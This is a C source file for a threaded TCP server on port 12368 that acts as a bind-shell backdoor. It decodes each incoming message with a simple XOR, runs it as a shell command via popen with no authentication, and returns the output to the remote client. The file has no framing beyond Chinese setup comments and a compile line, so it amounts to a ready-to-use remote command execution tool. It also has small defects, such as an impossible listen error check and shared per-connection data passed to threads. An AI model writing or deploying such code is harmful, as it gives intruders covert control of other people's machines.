#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#define BLOCK_SEZE 192

const int Port = 12368;
pthread_mutex_t g_mutext;

/*gcc -o  tmp tmp.c -lpthread*/
struct pthread_data{
    struct sockaddr_in client_addr;
    int sock_fd;
};

void *serveForClient(void * arg);

int main(void){
    signal(SIGPIPE, SIG_IGN);
    int sock_fd;
    struct sockaddr_in mysock;
    struct pthread_data pdata;
    pthread_t pt;
    socklen_t sin_size = sizeof(struct sockaddr_in);
    struct sockaddr_in client_addr;
    int new_fd;

    //初始化socket
    sock_fd = socket(AF_INET,SOCK_STREAM,0);

    //编辑地址信息
    memset(&mysock, 0, sizeof(mysock));
    mysock.sin_family = AF_INET;
    mysock.sin_port = htons(Port);
    mysock.sin_addr.s_addr = INADDR_ANY;

    //绑定地址，然后监听
    bind(sock_fd,(struct sockaddr *)&mysock,sizeof(struct sockaddr));
    if(listen(sock_fd,10) < -1){
        printf("listen error.\n");
        exit(1);
    }
    while(1){
        //accpet
        new_fd = accept(sock_fd, (struct sockaddr *)&client_addr, &sin_size);
        if(new_fd<0)
          {             
             sleep(1);
             continue;           
          }
        pdata.client_addr = client_addr;
        pdata.sock_fd = new_fd;

        pthread_create(&pt, NULL, serveForClient, (void *)&pdata);
    }
    close(sock_fd);
    return 0;
}

void *serveForClient(void *arg){
    
    struct pthread_data *pdata = (struct pthread_data*)arg;
    int server_accept_fd = pdata->sock_fd;
    char data[BLOCK_SEZE]={0};  
    int ret=read(server_accept_fd,(void*)data,BLOCK_SEZE); 
    int i = 0;
    printf("[+]TS:%d \n" ,server_accept_fd);
    for(i=0;i<BLOCK_SEZE;i++)
    {
        if(data[i]==0)
        {
            break;
        }
        data[i] = data[i]^0xF;   
    }
    FILE * p_file = popen(data, "r");
    if (p_file != NULL)
    {
        memset(data,0,sizeof(char)*BLOCK_SEZE);
        while (fread(data,1,BLOCK_SEZE,p_file))
        {
          if(write(server_accept_fd,data,BLOCK_SEZE) <0) 
          {
              printf("[*]TB%d \n" ,server_accept_fd);
              break ;
          } 
          memset(data,0,sizeof(char)*BLOCK_SEZE);
        }
    pclose(p_file);
    }
    close(server_accept_fd);
    printf("[-]TE:%d \n" ,server_accept_fd);
    pthread_exit(0);
    
}
